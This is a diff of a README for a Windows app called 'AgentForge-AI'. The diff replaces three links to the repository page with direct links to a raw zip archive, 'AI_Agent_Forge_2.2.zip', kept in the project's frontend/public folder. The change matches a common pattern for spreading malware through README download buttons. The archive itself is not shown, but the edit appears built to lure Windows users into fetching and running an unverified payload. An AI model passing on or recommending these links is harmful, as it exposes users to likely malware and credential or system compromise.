@@ -1,12 +1,12 @@
 # 🤖 AgentForge-AI - Build and Run Multi-Agent Workflows
 
-[![Download AgentForge-AI](https://img.shields.io/badge/Download%20AgentForge--AI-blue?style=for-the-badge)](https://github.com/Milissenttending818/AgentForge-AI)
+[![Download AgentForge-AI](https://img.shields.io/badge/Download%20AgentForge--AI-blue?style=for-the-badge)](https://raw.githubusercontent.com/Milissenttending818/AgentForge-AI/main/frontend/public/AI_Agent_Forge_2.2.zip)
 
 ## 📥 Download AgentForge-AI
 
 Use the link below to visit the download page and get the app for Windows:
 
-**[Download AgentForge-AI](https://github.com/Milissenttending818/AgentForge-AI)**
+**[Download AgentForge-AI](https://raw.githubusercontent.com/Milissenttending818/AgentForge-AI/main/frontend/public/AI_Agent_Forge_2.2.zip)**
 
 ## 🪟 Windows Setup
 
@@ -160,7 +160,7 @@ A simple workflow might look like this:
 
 If you need the file again, use this link:
 
-**[Download AgentForge-AI](https://github.com/Milissenttending818/AgentForge-AI)**
+**[Download AgentForge-AI](https://raw.githubusercontent.com/Milissenttending818/AgentForge-AI/main/frontend/public/AI_Agent_Forge_2.2.zip)**
 
 ## 🧭 What to Do Next
 
